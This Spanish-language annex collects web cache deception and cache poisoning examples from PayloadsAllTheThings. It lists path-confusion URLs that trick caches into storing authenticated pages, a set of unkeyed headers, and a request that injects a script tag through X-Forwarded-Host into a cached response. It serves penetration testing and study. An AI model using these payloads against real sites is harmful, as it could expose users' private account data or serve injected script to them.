# Web Cache Deception: anexo de ejemplos de PayloadsAllTheThings

> **Uso:** elegir el bloque que corresponde al motor, versión y punto de entrada. Las líneas de un bloque pueden ser alternativas. Sustituir hosts, rutas, identificadores y dominios por los del laboratorio o alcance autorizado. Los ejemplos originales son referencias de sintaxis, no pruebas verificadas contra el objetivo.

**Documento de origen:** [Web Cache Deception/README.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Web%20Cache%20Deception/README.md), revisión fija 3ac27901c711. **Licencia:** [MIT de Swissky](../../LICENCIA_PATT.md).

[← Índice de anexos](Catalogo_PATT.md) · [← Guía principal](README.md)

## 1. Engaño de caché web / Metodología

### Variantes presentes en tablas o texto del apartado

```text
http://www.example.com/home.php/non-existent.css
http://www.example.com/home.php
home.php
```

## 2. Metodología / Caché de datos sensibles

### Variantes presentes en tablas o texto del apartado

```text
https://www.example.com/myaccount/home/
https://www.example.com/myaccount/home/malicious.css
/api/auth/session
```

## 3. Metodología / Caché de JavaScript personalizado

```js
    Values: User-Agent
    Values: Cookie
    Header: X-Forwarded-Host
    Header: X-Host
    Header: X-Forwarded-Server
    Header: X-Forwarded-Scheme (header; also in combination with X-Forwarded-Host)
    Header: X-Original-URL (Symfony)
    Header: X-Rewrite-URL (Symfony)
```

```js
    GET /test?buster=123 HTTP/1.1
    Host: target.com
    X-Forwarded-Host: test"><script>alert(1)</script>

    HTTP/1.1 200 OK
    Cache-Control: public, no-cache
    [..]
    <meta property="og:image" content="https://test"><script>alert(1)</script>">
```

### Variantes presentes en tablas o texto del apartado

```text
X-Forwarded-Host
```

## 4. Engaño de caché web / Trucos

### Variantes presentes en tablas o texto del apartado

```text
https://example.com/app/conversation/.js?test
https://example.com/app/conversation/;.js
https://example.com/home.php/non-existent.css
```

## 5. Engaño de caché web / Detección de engaño de caché web

### Variantes presentes en tablas o texto del apartado

```text
/path/<dynamic-resource>;<static-resource>
/settings/profile;script.js
;
/settings/profile
/wcd/..%2fprofile
/profile
```

## 6. Engaño de caché web / Caché de Cloudflare

### Variantes presentes en tablas o texto del apartado

```text
Cache-Control
max-age
Content-Type
```

---

[← Índice de anexos](Catalogo_PATT.md) · [← Guía principal](README.md) · [Licencia de origen](../../LICENCIA_PATT.md)
